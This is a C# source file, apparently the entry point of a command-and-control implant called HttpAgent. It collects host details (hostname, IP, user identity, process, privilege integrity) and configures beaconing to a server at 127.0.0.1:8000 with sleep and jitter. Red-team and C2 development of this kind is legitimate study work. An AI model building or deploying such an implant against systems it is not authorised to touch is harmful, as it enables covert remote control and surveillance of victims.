using System;
using AgentCore.Controllers;
using AgentCore.Models;
using HttpAgent.Modules;

namespace HttpAgent
{
    class Program
    {
        static void Main(string[] args)
        {
            var metadata = new Metadata
            {
                AgentId = "asfsadf",
                Hostname = AgentCore.Helpers.GetHostname,
                IPAddress = AgentCore.Helpers.GetIpAddress,
                Identity = AgentCore.Helpers.GetIdentity,
                ProcessName = AgentCore.Helpers.GetProcessName,
                ProcessId = AgentCore.Helpers.GetProcessId,
                Arch = AgentCore.Helpers.GetArch,
                Integrity = AgentCore.Helpers.GetIntegrity,
            };

            var config = new ConfigController();
            config.SetOption(ConfigSetting.Metadata, metadata);
            config.SetOption(ConfigSetting.ConnectHost, "127.0.0.1");
            config.SetOption(ConfigSetting.ConnectPort, 8000);
            config.SetOption(ConfigSetting.SleepTime, 1);
            config.SetOption(ConfigSetting.Jitter, 0);

            var commModule = new HttpCommModule();
            commModule.Init(config);

            var agent = new AgentController(config, commModule);
            agent.Start();
        }
    }
}
